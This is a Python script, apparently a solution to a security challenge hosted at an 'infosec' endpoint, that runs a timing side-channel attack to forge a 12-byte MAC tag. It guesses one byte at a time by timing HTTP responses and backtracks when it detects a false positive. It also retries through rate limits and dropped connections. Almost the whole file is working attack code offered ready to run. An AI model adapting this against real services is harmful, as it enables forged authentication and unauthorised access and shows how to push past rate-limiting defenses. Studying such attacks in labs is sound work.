import requests
import time
from requests.exceptions import ConnectionError

TARGET_URL = "https://interrato.dev/infosec/variabletime"
MESSAGE = "test_message"
NUM_BYTES = 12

# Create a global session to reuse TCP connections (Keep-Alive).
session = requests.Session()


def measure_time(tag_guess_hex):
    """
    Sends an HTTP GET request with a forged MAC tag and measures the response time
    Handles network noise, rate limiting, and connection drops
    """
    url = f"{TARGET_URL}?message={MESSAGE}&tag={tag_guess_hex}"
    
    # Infinite loop to handle retries upon network or rate-limit errors
    while True:
        # Start high-resolution timer
        start_time = time.perf_counter()
        
        try:
            # Send request using the global session with a 5-second timeout
            response = session.get(url, timeout=5)
            
        except ConnectionError:
            # The server abruptly closed the connection (often due to aggressive rate limiting)
            print("Connection aborted by the server. Pausing for 3 seconds...")
            time.sleep(3)
            continue # Retry the exact same request
            
        except requests.exceptions.Timeout:
            # The server took longer than 5 seconds to respond
            print("Request timeout. Pausing for 2 seconds...")
            time.sleep(2)
            continue

        # Stop timer
        end_time = time.perf_counter()
        
        # Handle HTTP 429: Too Many Requests
        if response.status_code == 429:
            print("Rate limit (429) reached, pausing for 2 seconds...")
            time.sleep(2) 
            continue
            
        # Handle HTTP 200: Success! The MAC is correct.
        if response.status_code == 200:
            return float('inf'), True
            
        # Handle other codes: 
        # The MAC is wrong, but we have successfully measured how long it took to fail.
        return (end_time - start_time), False


def attack():
    """
    Main function executing the timing attack using a "Self-Healing" Backtracking algorithm.
    It guesses the MAC byte by byte, detecting and recovering from network-induced false positives.
    """
    # List to store confirmed correct bytes (using a list allows easy popping for backtracking)
    known_tag = []  
    # Bytearray to hold the current full 12-byte guess being sent to the server
    guess_test = bytearray(NUM_BYTES)
    
    # Attack Thresholds (Must be calibrated based on the target server)
    soglia_salto = 0.04  # Minimum time difference (in seconds) required to consider a byte "correct"
    soglia_crescita_baseline = 0.035 # Minimum expected baseline increase between consecutive bytes
    
    byte_index = 0
    # Dictionary storing the calculated baseline time for each byte index
    baselines_history = {}
    
    # Dictionary of Sets. For each index, it stores bytes that were previously guessed
    # but later discovered to be false positives.
    blacklist = {i: set() for i in range(NUM_BYTES)}

    # Use a while loop instead of a for loop to allow moving backward (backtracking)
    while byte_index < NUM_BYTES:
        print(f"\n---> Analyzing Byte: {byte_index} | Partial Tag: {[hex(b) for b in known_tag]}")
        
        # Clear the blacklist for all FUTURE bytes. If we just backtracked, 
        # previous assumptions about future bytes are invalid.
        for i in range(byte_index + 1, NUM_BYTES):
            blacklist[i].clear()

        # 1. LOCAL BASELINE CALCULATION
        # Calculate the base failure time for the CURRENT byte position.
        # We test 3 arbitrary bytes. Since only 1 out of 256 is correct, 
        # taking the minimum time of these tests guarantees we measure a true failure.
        tempi_dummy = []
        dummy_guesses = [0x00, 0x01, 0x02] 
        
        for dummy in dummy_guesses:
            guess_test[byte_index] = dummy
            hex_tag_to_send = guess_test.hex()
            
            # Take 5 measurements per dummy to filter out random network lag
            misurazioni = []
            for _ in range(5):
                (elapsed_time, success) = measure_time(hex_tag_to_send)
                if success:
                    print(f"\n[+] VICTORY! The tag is: {hex_tag_to_send}")
                    import sys; sys.exit(0)
                misurazioni.append(elapsed_time)
            
            # The minimum time represents the cleanest network transit
            tempi_dummy.append(min(misurazioni))
            
        # The local baseline is the lowest failure time measured at this byte index
        local_baseline = min(tempi_dummy)
        print(f"  [Local Baseline calculated: {local_baseline:.4f}s]")


        # 2. BACKTRACKING LOGIC
        # Check if the previous byte was actually correct by comparing baselines
        if byte_index > 0:
            baseline_precedente = baselines_history[byte_index - 1]
            crescita = local_baseline - baseline_precedente
            
            # Every correct byte should add ~0.05s. If the baseline didn't grow,
            # the server failed at the previous byte, meaning our last guess was a false positive
            if crescita < soglia_crescita_baseline:
                print(f"  [!] ERROR DETECTED! Baseline grew by only {crescita:.4f}s.")
                print(f"  [!] Previous byte ({hex(known_tag[-1])}) was a false positive.")
                
                # Add the lying byte to the blacklist for that index
                blacklist[byte_index - 1].add(known_tag[-1])
                
                # Remove the bad byte from our known_tag stack
                known_tag.pop()
                
                # Move one step back and restart the loop
                byte_index -= 1
                continue 
                
        # If everything is fine, record the healthy baseline
        baselines_history[byte_index] = local_baseline

        # 3. CURRENT BYTE SEARCH
        best_time = 0
        best_byte = -1
        trovato = False

        # Smart Recovery from False Positives
        start_guess = 0 
        # If we are revisiting an index, start testing from the byte immediately 
        # following the highest false positive we've already tried.
        if blacklist[byte_index]:
            ultimo_falso_positivo = max(blacklist[byte_index])
            start_guess = ultimo_falso_positivo + 1
            print(f"  [>] Smart Recovery! Skipping tests up to {hex(ultimo_falso_positivo)}. Restarting from {hex(start_guess)}.")

        # Test remaining byte candidates
        for guess in range(start_guess, 256):
            guess_test[byte_index] = guess
            hex_tag_to_send = guess_test.hex()
            
            # Measure time 5 times and take the minimum
            times_for_this_guess = []
            for _ in range(5):
                (elapsed_time, success) = measure_time(hex_tag_to_send)
                if success:
                    print(f"\n[+] VICTORY! The full tag is: {hex_tag_to_send}")
                    import sys; sys.exit(0)
                times_for_this_guess.append(elapsed_time)
                
            clean_time = min(times_for_this_guess)
            
            # Plan B: Always keep track of the absolute maximum time found
            if clean_time > best_time:
                best_time = clean_time
                best_byte = guess
            
            # Plan A (Early Exit): If the time clearly exceeds the baseline + threshold,
            # we assume the server processed this byte and moved to the next one.
            if clean_time > (local_baseline + soglia_salto):
                print(f"  [!] Clean jump found: {clean_time:.4f}s. Byte {hex(guess)} passed!")
                trovato = True
                break

        # If Plan A failed (no clear jump), fallback to Plan B
        if not trovato:
            print(f" No clear jump found. Relying on Plan B (Max time: {best_time:.4f}s)")
            
        # Confirm the chosen byte and update arrays
        print(f" Byte {byte_index} confirmed: {hex(best_byte)}")
        known_tag.append(best_byte)
        guess_test[byte_index] = best_byte
        
        # Move forward to the next byte
        byte_index += 1

if __name__ == "__main__":
    attack()